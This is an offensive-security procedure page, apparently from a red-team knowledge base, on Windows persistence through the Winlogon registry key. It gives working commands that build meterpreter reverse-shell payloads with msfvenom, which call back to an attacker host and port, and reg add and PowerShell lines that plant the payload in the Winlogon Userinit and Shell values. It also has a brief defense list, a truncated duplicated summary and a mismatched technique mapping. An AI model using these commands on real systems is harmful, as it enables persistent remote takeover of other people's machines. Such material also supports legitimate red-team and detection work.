---
id: 8ed32d30-ebfe-4c9c-ae61-06aaf981da2a
name: Windows Registry HKLM Winlogon Helper DLL Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:28.022255+00:00'
updated_at: '2023-04-10T20:37:21.582308+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Accessibility Features|T1015 - Accessibility Features]]'
- '[[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]'
tags:
- '[[Elevated]]'
- '[[Registry HKLM]]'
- '[[Windows - Persistence]]'
- '[[Winlogon Helper DLL]]'
commands:
- '[[Add Payload to Winlogon Registry Key]]'
- '[[Create Meterpreter Payload]]'
---

# Windows Registry HKLM Winlogon Helper DLL Persistence

## Summary

This procedure involves adding a malicious DLL to the Winlogon Helper DLL registry key in HKLM. This allows the attacker to execute code at system boot, with SYSTEM level privileges. The malicious DLL can then be used to maintain persistence, execute further attacks, or exfiltrate data. This techni

## Description

# Description

This procedure involves adding a malicious DLL to the Winlogon Helper DLL registry key in HKLM. This allows the attacker to execute code at system boot, with SYSTEM level privileges. The malicious DLL can then be used to maintain persistence, execute further attacks, or exfiltrate data. This technique can be used to bypass endpoint protection and evade detection. From a business perspective, this attack can result in data theft, system compromise, and reputational damage.

## Requirements

1. Administrator or SYSTEM level access to the target system

1. Access to the target system's registry

1. Ability to create a malicious DLL

## Defense

1. Monitor the Winlogon Helper DLL registry key for any unauthorized changes

1. Use application whitelisting to prevent unauthorized DLLs from running

1. Restrict access to the registry to only authorized personnel

## Objectives

1. Achieve persistence on the target system

1. Execute code with SYSTEM level privileges

1. Maintain access to the compromised system

# Instructions

1. This command creates a Windows binary persistence by creating two binaries, one in .exe and the other in .dll format, and then adding them to the Windows registry. The binaries are created using msfvenom with the windows/meterpreter/reverse_tcp payload, which allows for remote access to the compromised system. The LHOST and LPORT parameters specify the IP address and port number of the attacker's machine. The binaries are saved as evilbinary.exe and evilbinary.dll respectively. The registry keys added are HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell. The /v flag specifies the value name, /d specifies the data, and /f specifies to force the update. Finally, the Set-ItemProperty command updates the Userinit and Shell values with the newly created binaries.

**Code**: [[msfvenom -p windows/meterpreter/reverse_tcp LHOST=]]

> The purpose of this command is to maintain persistence on a compromised Windows machine by creating two binaries and adding them to the Windows registry. Once the registry keys are updated, the binaries will be executed every time the system boots up, allowing the attacker to maintain remote access to the compromised machine.

**Command** ([[Create Meterpreter Payload]]):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll
```

**Command** ([[Add Payload to Winlogon Registry Key]]):

```bash
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
```

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Accessibility Features|T1015 - Accessibility Features]]
- [[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]

## Commands Used

- [[Add Payload to Winlogon Registry Key]]
- [[Create Meterpreter Payload]]

## Tags

- [[Elevated]]
- [[Registry HKLM]]
- [[Windows - Persistence]]
- [[Winlogon Helper DLL]]
